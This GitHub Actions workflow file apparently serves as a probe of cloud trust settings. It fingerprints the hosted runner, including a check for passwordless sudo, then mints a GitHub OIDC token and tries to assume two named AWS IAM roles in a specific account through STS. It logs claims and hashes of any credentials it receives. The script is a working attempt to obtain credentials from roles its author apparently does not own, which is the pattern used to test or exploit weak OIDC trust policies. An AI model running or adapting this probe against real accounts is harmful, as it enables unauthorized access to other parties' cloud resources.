name: aext0102-i121040-oidc
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
concurrency:
  group: aext0102-i121040
  cancel-in-progress: false
jobs:
  keyless-oidc-probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Hosted runner identity (redacted, no secrets)
        run: |
          set -u
          python3 - <<'PY'
          import json, os, subprocess
          def sh(c):
              try:
                  return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=25).stdout.strip()[:300]
              except Exception as e:
                  return 'ERR:' + type(e).__name__
          info = {
            'runner_name': os.environ.get('RUNNER_NAME'),
            'runner_environment': os.environ.get('RUNNER_ENVIRONMENT'),
            'runner_os': os.environ.get('RUNNER_OS'),
            'runner_arch': os.environ.get('RUNNER_ARCH'),
            'image_os': os.environ.get('ImageOS'),
            'uname': sh('uname -a'),
            'os_release': sh("grep -E '^(NAME|VERSION)=' /etc/os-release | tr '\\n' ' '"),
            'cpu_model': sh("grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs"),
            'nproc': sh('nproc'),
            'mem_total': sh('grep -m1 MemTotal /proc/meminfo'),
            'user': sh('id -un'),
            'sudo_nopasswd': sh('sudo -n true 2>/dev/null && echo yes || echo no'),
            'docker': sh('docker version --format "{{.Server.Version}}" 2>/dev/null || echo absent'),
            'nvidia_smi': sh('nvidia-smi -L 2>&1 | head -2 || echo absent'),
          }
          print('AEXT_RUNNER ' + json.dumps(info, sort_keys=True))
          PY
      - name: Keyless OIDC mint, redacted claims, keyless AssumeRoleWithWebIdentity
        run: |
          set -u
          umask 077
          python3 - <<'PY'
          import base64, hashlib, json, os, urllib.error, urllib.parse, urllib.request
          import xml.etree.ElementTree as ET

          AUD = 'sts.amazonaws.com'
          url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
          reqtok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
          out = {'aud_requested': AUD, 'event': os.environ.get('GITHUB_EVENT_NAME')}
          if not url or not reqtok:
              print('AEXT_CLAIMS ' + json.dumps({'error': 'no_id_token_endpoint'}))
              raise SystemExit(0)
          r = urllib.request.Request(url + '&audience=' + urllib.parse.quote(AUD),
                                     headers={'Authorization': 'bearer ' + reqtok, 'User-Agent': 'aext-i121040'})
          try:
              with urllib.request.urlopen(r, timeout=30) as resp:
                  body = json.loads(resp.read())
          except Exception as e:
              print('AEXT_CLAIMS ' + json.dumps({'error': 'mint_failed', 'detail': type(e).__name__}))
              raise SystemExit(0)
          tok = body.get('value') or ''
          out['token_present'] = bool(tok)
          out['token_sha256'] = hashlib.sha256(tok.encode()).hexdigest()
          payload = {}
          if tok:
              parts = tok.split('.')
              pad = '=' * (-len(parts[1]) % 4)
              try:
                  payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
              except Exception:
                  payload = {}
          canon = json.dumps(payload, sort_keys=True, separators=(',', ':'))
          out['payload_sha256'] = hashlib.sha256(canon.encode()).hexdigest()
          for k in ('iss', 'sub', 'aud', 'repository', 'ref', 'event_name'):
              out[k] = payload.get(k)
          print('AEXT_CLAIMS ' + json.dumps(out, sort_keys=True))
          if not tok:
              raise SystemExit(0)


          def lname(el):
              return el.tag.split('}')[-1]

          def child(el, name):
              for ch in list(el):
                  if lname(ch) == name:
                      return ch
              return None

          def descend(el, *names):
              cur = el
              for n in names:
                  cur = child(cur, n)
                  if cur is None:
                      return None
              return cur

          def child_text(el, name):
              ch = child(el, name)
              return (ch.text or '') if ch is not None else ''

          def descend_text(el, *names):
              t = descend(el, *names)
              return (t.text or '') if t is not None else ''

          STS = 'https://sts.amazonaws.com/'
          roles = ['arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole',
                   'arn:aws:iam::159553542841:role/adai-template-publisher']
          for role in roles:
              form = urllib.parse.urlencode({
                  'Action': 'AssumeRoleWithWebIdentity',
                  'Version': '2011-06-15',
                  'RoleArn': role,
                  'RoleSessionName': 'aext-i121040-canary',
                  'WebIdentityToken': tok,
                  'DurationSeconds': '900',
              }).encode()
              rec = {'role_arn': role}
              try:
                  req2 = urllib.request.Request(STS, data=form,
                                                headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                         'User-Agent': 'aext-i121040'})
                  with urllib.request.urlopen(req2, timeout=30) as resp2:
                      raw = resp2.read()
                  root = ET.fromstring(raw)
                  creds = descend(root, 'AssumeRoleWithWebIdentityResult', 'Credentials')
                  if creds is not None:
                      akid = child_text(creds, 'AccessKeyId')
                      sess = child_text(creds, 'SessionToken')
                      rec.update({'result': 'success',
                                  'expiration': child_text(creds, 'Expiration'),
                                  'access_key_id_sha256_16': hashlib.sha256(akid.encode()).hexdigest()[:16],
                                  'session_token_sha256_16': hashlib.sha256(sess.encode()).hexdigest()[:16]})
                  else:
                      rec.update({'result': 'no_credentials_element', 'root_local': root.tag.split('}')[-1]})
              except urllib.error.HTTPError as e:
                  errbody = e.read()
                  try:
                      root = ET.fromstring(errbody)
                      code = descend_text(root, 'Error', 'Code')
                      msg = descend_text(root, 'Error', 'Message')
                  except Exception:
                      code, msg = 'http_' + str(e.code), ''
                  rec.update({'result': 'error', 'http': e.code, 'error_code': code, 'error_message': (msg or '')[:300],
                              'body_head': errbody[:160].decode('utf-8', 'replace')})
              except Exception as e:
                  rec.update({'result': 'exception', 'detail': type(e).__name__})
              print('AEXT_ROLE ' + json.dumps(rec, sort_keys=True))
          print('AEXT_DONE')
          PY
